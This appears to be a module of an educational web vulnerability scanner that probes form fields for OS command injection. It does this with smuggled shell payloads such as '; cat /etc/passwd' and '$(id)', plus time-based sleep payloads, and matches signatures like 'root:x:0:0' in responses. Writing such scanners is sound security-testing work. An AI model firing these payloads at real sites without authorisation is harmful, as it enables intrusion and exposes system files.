"""
Module: cmd_injection.py
OWASP  : A03:2021 – Injection
Purpose: Test form fields for OS command injection vulnerabilities.
"""

import requests
import time

HEADERS = {"User-Agent": "WebVulnScanner/1.0 (Educational Pentest Tool)"}

# ── Command Injection Payloads ─────────────────────────────────────────
CMD_PAYLOADS = [
    "; ls",
    "| ls",
    "& ls",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "`id`",
    "$(id)",
    "; id",
    "| id",
]

# Time-based payloads for blind detection (cause a sleep)
TIME_PAYLOADS = [
    "; sleep 3",
    "| sleep 3",
    "& sleep 3",
    "; ping -c 3 127.0.0.1",
]

# Signatures in response that indicate command execution
CMD_SIGNATURES = [
    "root:x:0:0",        # /etc/passwd
    "uid=",              # output of id command
    "gid=",
    "www-data",
    "bin/bash",
    "/usr/bin",
]


def submit_form(form, data, timeout=5):
    """Submit form with given data."""
    try:
        if form["method"] == "post":
            return requests.post(form["action"], data=data,
                                 headers=HEADERS, timeout=timeout, verify=False)
        else:
            return requests.get(form["action"], params=data,
                                headers=HEADERS, timeout=timeout, verify=False)
    except Exception:
        return None


def test_command_injection(forms, timeout=5):
    """Test forms for command injection vulnerabilities."""
    vulns = []

    for form in forms:
        for inp in form["inputs"]:
            if inp["type"] in ("submit", "button", "image", "reset"):
                continue

            param_name = inp["name"]

            # ── Response-based detection ──
            for payload in CMD_PAYLOADS:
                data = {i["name"]: i["value"] or "test" for i in form["inputs"]}
                data[param_name] = payload

                resp = submit_form(form, data, timeout)
                if resp and any(sig in resp.text for sig in CMD_SIGNATURES):
                    vulns.append({
                        "url":     form["action"],
                        "param":   param_name,
                        "payload": payload,
                        "detail":  (
                            f"Command injection in parameter '{param_name}'. "
                            f"OS command output visible in response."
                        )
                    })
                    break

            # ── Time-based blind detection ──
            for payload in TIME_PAYLOADS:
                data = {i["name"]: i["value"] or "test" for i in form["inputs"]}
                data[param_name] = payload

                start = time.time()
                submit_form(form, data, timeout=timeout + 4)
                elapsed = time.time() - start

                if elapsed >= 2.8:
                    vulns.append({
                        "url":     form["action"],
                        "param":   param_name,
                        "payload": payload,
                        "detail":  (
                            f"Blind command injection in '{param_name}' — "
                            f"response delayed {elapsed:.1f}s with: {payload}"
                        )
                    })
                    break

    return vulns
